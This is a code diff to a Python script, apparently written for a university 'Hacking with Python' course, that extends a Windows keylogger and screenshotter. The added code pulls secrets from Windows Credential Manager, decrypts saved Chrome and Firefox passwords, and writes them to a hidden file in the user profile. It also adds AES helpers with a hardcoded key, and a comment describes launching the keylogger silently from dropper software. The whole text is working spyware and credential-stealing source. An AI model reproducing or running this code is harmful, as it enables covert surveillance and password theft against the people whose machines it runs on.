@@ -16,6 +16,14 @@ import win32gui
 import win32ui
 import win32con
 import win32api
+import pyaes
+import impacket
+import win32cred
+import pywintypes
+import win32cred
+import sqlite3
+import shutil
+import win32crypt
 
 #Variables
 user32 = windll.user32
@@ -24,8 +32,11 @@ psapi = windll.psapi
 current_window = None
 current_hwnd = 0
 screenshot_path = "C:\\Users\\Manuel\\Studium\\Semester 5\\Hacking with Python\\Hausarbeite_Hacking_with_Python\\"
+screenshot_number = 0
 
 #Functions
+
+#------------------------Keylogger and Screenshotter------------------------
 def get_current_process():
     # get a handle to the foreground window
     hwnd = user32.GetForegroundWindow()
@@ -57,11 +68,21 @@ def get_current_process():
 
 def WriteToFile(s):
      # save keystrokes to a file
-    if not os.path.exists(str(screenshot_path) + "keystrokes"):
-        os.makedirs(str(screenshot_path) + "keystrokes")
-        open("/keystrokes/test.txt", "w")
+    if not os.path.exists(str(get_path()) + "keystrokes"):
+        os.makedirs(str(get_path()) + "keystrokes")
+        open(str(get_path()) + "/keystrokes/test.txt", "w")
     # Modus a + fuers updaten der datei
-    file = open('./keystrokes/test.txt', 'a+') 
+    file = open(str(get_path()) + '/keystrokes/test.txt', 'a+') 
+    file.write(s)
+    file.close()
+
+def WritePasswordToFile(s):
+    # save keystrokes to a file
+    if not os.path.exists(str(get_path()) + "keystrokes"):
+        os.makedirs(str(get_path()) + "keystrokes")
+        open(str(get_path()) + "/keystrokes/enc_dec.txt", "w")
+    # Modus a + fuers updaten der datei
+    file = open(str(get_path()) + '/keystrokes/enc_dec.txt', 'a+') 
     file.write(s)
     file.close()
 
@@ -70,6 +91,9 @@ def KeyStroke(event) :
     # check to see if target changed windows
     if event.WindowName != current_window :
         current_window = event.WindowName
+        global screenshot_number
+        screenshot_number += 1
+        SaveScreenshot("program" + str(screenshot_number) + ".png")
         get_current_process()
     # if they pressed a standard key
     if 32 < event.Ascii < 127:
@@ -93,7 +117,6 @@ def KeyStroke(event) :
     return True
 
 
-
 def SaveScreenshot(filename):
     # grab a handle to the main desktop window
     hdesktop = win32gui.GetDesktopWindow()
@@ -114,13 +137,122 @@ def SaveScreenshot(filename):
     # copy the screen into our memory device context
     mem_dc.BitBlt((0 , 0), (width, height), img_dc, (left ,top), win32con.SRCCOPY)
     # save the bitmap to a file
-    if not os.path.exists(str(screenshot_path) + "screenshots"):
-        os.makedirs(str(screenshot_path) + "screenshots")
-    screenshot.SaveBitmapFile(mem_dc, str(screenshot_path) + "/screenshots/" + filename)
+    if not os.path.exists(str(get_path()) + "screenshots"):
+        os.makedirs(str(get_path()) + "screenshots")
+    screenshot.SaveBitmapFile(mem_dc, str(get_path()) + "/screenshots/" + filename)
     # free our objects
     mem_dc.DeleteDC()
     win32gui.DeleteObject(screenshot.GetHandle())
-    SaveScreenshot("test.png")
+    #number += 1
+    #SaveScreenshot("test" + str(number) + ".png", number)
+#------------------------END Keylogger and Screenshotter------------------------
+
+
+#------------------------Communication encryption Function------------------------
+def AESencrypt(message, key):
+    key = "This is a key123"
+    aes = pyaes.AESModeOfOperationCTR(str.encode(str(key)[:32]))
+    ciphertext = aes.encrypt(message)
+    return ciphertext
+
+#Aes decrypt
+def AESdecrypt(ciphertext, key):
+    if type(ciphertext) == type("hallo"):
+        ciphertext = bytes(ciphertext, 'utf-8')[2:-1]
+        ciphertext = ciphertext.decode('unicode_escape').encode('raw_unicode_escape')
+    aes = pyaes.AESModeOfOperationCTR(str.encode(str(key)[:32]))
+    plaintext = aes.decrypt(ciphertext)
+    return plaintext
+#------------------------END Communication encryption Function------------------------
+
+#------------------------Passwordextraction------------------------
+#get current user path
+def get_path():
+    #name = os.getlogin()    #-to get only the username
+    path = os.path.join(os.path.expandvars("%userprofile%" + "\\"))
+    return path
+
+#get all passwords from the windows credential manager
+def get_credman_passwords(quiet=0):
+    try:
+        credman = win32cred.CredEnumerate(None, 0)
+        for i in credman:
+            password = win32cred.CredRead(i['TargetName'], i['Type'])
+            if password['CredentialBlob']:
+                WritePasswordToFile(password)
+                password = password.encode('unicode_escape').decode('raw_unicode_escape')
+                print(password)
+                WritePasswordToFile("Encoded: " + str(password))
+    except pywintypes.error as e:
+        if not quiet:
+            if e[0] == 5:
+                print("Access denied.")
+            elif e[0] == 1168:
+                print("No credentials stored for this user.")
+            elif e[0] == 1312:
+                print("Call for CredEnumerate failed: No such login Session! Does not work for Network Logins.")
+        return None
+
+#get all passwords from the chrome database
+def get_chrome_passwords(quiet=0):
+    try:
+        chrome_path = os.path.join(os.path.expanduser('~'), 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Login Data')
+        shutil.copyfile(chrome_path, chrome_path + ".bak")
+        conn = sqlite3.connect(chrome_path + ".bak")
+        cursor = conn.cursor()
+        cursor.execute('SELECT action_url, username_value, password_value FROM logins')
+        for result in cursor.fetchall():
+            password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)
+            if password[1]:
+                WritePasswordToFile("Chrome Password: " + str(password))
+    except sqlite3.OperationalError as e:
+        if not quiet:
+            if e[0] == 'Database is locked':
+                print("Chrome is currently running. This function only works if Chrome is closed.")
+            else:
+                print(e)
+        return None
+    except pywintypes.error as e:
+        if not quiet:
+            if e[0] == 5:
+                print("Access denied.")
+            elif e[0] == 1168:
+                print("No credentials stored for this user.")
+        return None
+    finally:
+        conn.close()
+        os.remove(chrome_path + ".bak")        
+
+#get all passwords from the firefox database
+def get_firefox_passwords(quiet=0):
+    try:
+        firefox_path = os.path.join(os.path.expanduser('~'), 'AppData', 'Roaming', 'Mozilla', 'Firefox', 'Profiles')
+        for file in os.listdir(firefox_path):
+            if file.endswith(".default"):
+                conn = sqlite3.connect(os.path.join(firefox_path, file, 'signons.sqlite'))
+                cursor = conn.cursor()
+                cursor.execute('SELECT hostname, encryptedUsername, encryptedPassword FROM moz_logins')
+                for result in cursor.fetchall():
+                    password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)
+                    if password[1]:
+                        WritePasswordToFile("Firefox Password: " + str(password))
+    except sqlite3.OperationalError as e:
+        if not quiet:
+            if e[0] == 'Database is locked':
+                print("Firefox is currently running. This function only works if Firefox is closed.")
+            else:
+                print(e)
+        return None
+    except pywintypes.error as e:
+        if not quiet:
+            if e[0] == 5:
+                print("Access denied.")
+            elif e[0] == 1168:
+                print("No credentials stored for this user.")
+        return None
+    finally:
+        conn.close()
+#------------------------END Passwordextraction------------------------
 
 
 #Test all of the above functions:
@@ -131,11 +263,11 @@ def main():
     #test function keyStroke
     get_current_process()
 
-    #kl = pyWinhook.HookManager()
-    #kl.KeyDown = KeyStroke
-    # register the hook and execute forever
-    #kl.HookKeyboard()
-    #pythoncom.PumpMessages()
+    #test path function
+    #print(get_path())
+
+   #############to run this keylogger silently, meaning without a shown console, one would have to start it with pythonw <script.py>
+   #############this is meant to run a script with a GUI. meaning the keylogger will be run silently in the background... (Start from Dropper software)
 
 if __name__ == "__main__":
     main()
